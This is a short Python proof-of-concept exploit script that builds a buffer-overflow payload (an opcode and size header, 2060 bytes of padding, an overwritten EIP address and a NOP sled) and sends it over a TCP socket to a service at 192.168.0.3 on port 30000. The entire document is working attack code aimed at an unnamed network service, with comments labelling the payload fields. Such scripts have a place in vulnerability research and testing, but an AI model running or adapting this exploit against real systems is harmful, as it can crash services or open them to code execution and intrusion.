#!/usr/bin/env python
   
import socket
 
Shell="A"*2060
EIP="\x00\x10\x40\x00"
buff="\xD1\x07\x00\x00" + "\x1C\x08\x00\x00" + Shell + EIP + "\x90\x90\x90\x90\x90\x90\x90\x90" + EIP
          #OpCode                        Size of the next data                                   Junk
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.3", 30000))
s.send(buff)
